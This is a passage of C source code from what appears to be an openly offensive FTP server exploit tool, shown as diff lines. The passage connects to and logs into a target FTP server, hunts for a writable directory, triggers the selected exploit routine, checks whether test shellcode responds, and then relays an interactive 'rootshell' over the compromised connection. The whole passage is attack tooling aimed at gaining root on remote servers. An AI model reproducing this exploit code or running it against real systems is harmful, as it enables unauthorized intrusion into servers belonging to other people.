+            err (0, "jmpbuf string too short.. check for 0x0's.\n");
+
+    putserv ("%s\n", string);
+
+    getline ();
+
+    return (1);
+}
+
+/* shell
+ *
+ * provide a pseudo shell..
+ *
+ * return nothing
+ */
+void
+shell (void)
+{
+        char    buf[5120];
+        int     l;
+        fd_set  rfds;
+
+        printf("%sSpawning rootshell:%s\n", C_RED, C_NORM);
+
+        while (1) {
+                FD_SET (0, &rfds);
+                FD_SET (fd, &rfds);
+
+                select (fd+1, &rfds, NULL, NULL, NULL);
+                if (FD_ISSET (0, &rfds)) {
+                        l = read (0, buf, sizeof (buf));
+                        if (l <= 0)
+                                cleanup_and_exit ();
+                        xwrite (fd, buf, l);
+                }
+
+                if (FD_ISSET (fd, &rfds)) {
+                        l = read (fd, buf, sizeof (buf));
+                        if (l <= 0)
+                                cleanup_and_exit ();
+                        xwrite (1, buf, l);
+                }
+        }
+}
+
+/* check_test_return
+ *
+ * Check if testcode sploiting was successfull.
+ *
+ * return 0 on failure
+ * return 1 on success
+ */
+
+int check_test_return(char *what, int len) {
+    char line[1024];
+    int i, flags;
+    fd_set rset;
+    struct timeval  tv;
+
+    printf("w8ing for testshellcode to respond...\n");
+    flags = fcntl(fd, F_GETFL, 0);
+    if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0)
+        err(1, "fcntl fucked up (testshellcode)");
+
+    FD_ZERO(&rset);
+    FD_SET(fd, &rset);
+
+    tv.tv_sec = 10;
+    tv.tv_usec = 0;
+
+    if (!select(fd + 1, &rset, NULL, NULL, &tv))
+        err(0, "select timed out(testshellcode)");
+
+    i = read(fd, line, len);
+    if (!strncmp(what, line, len)) {
+        printf("%sSploit successfull!%s\n", C_RED, C_NORM);
+        return(1);
+    };
+    printf("%sSploit not successfull!%s\n", C_RED, C_NORM);
+    return(0);
+}
+
+int
+main (int argc, char **argv)
+{
+        int i;
+        title ();
+
+        if (argc < 3)
+                usage (argv[0]);
+
+        signal (SIGINT, (void *) &sighandler);
+        signal (SIGQUIT, (void *) &sighandler);
+
+        parseargs (argc, argv);
+
+        printf("Connecting...\n");
+        connect_to_ftp ();
+
+        log_into_ftp ();
+        if (sptr->need_writable || tesopt.dirscanonly) {
+            printf ("Logged in! Searching for a writable directory...\n");
+            if (!recurse_writable())
+                    err (0, "kurwa mac! no writable dir found\n");
+        } else {
+            printf ("Logged in!\n");
+        }
+
+        getpwd ();
+        printf ("       %s is writable.. rock on!\n", hostinf.pwd);
+
+        if (!tesopt.dirscanonly) {
+            printf("Trying to sploit...\n");
+            sptr->code();
+            tesopt.testonly ? i = check_test_return("teso\n", 5) : shell();
+            if (!i) 
+                printf ("sploiting not successfull\n");
+        }
+
+        cleanup_and_exit();
+        return (0); /* not reached */
+}
+---ifafoffuffoffaf.c---
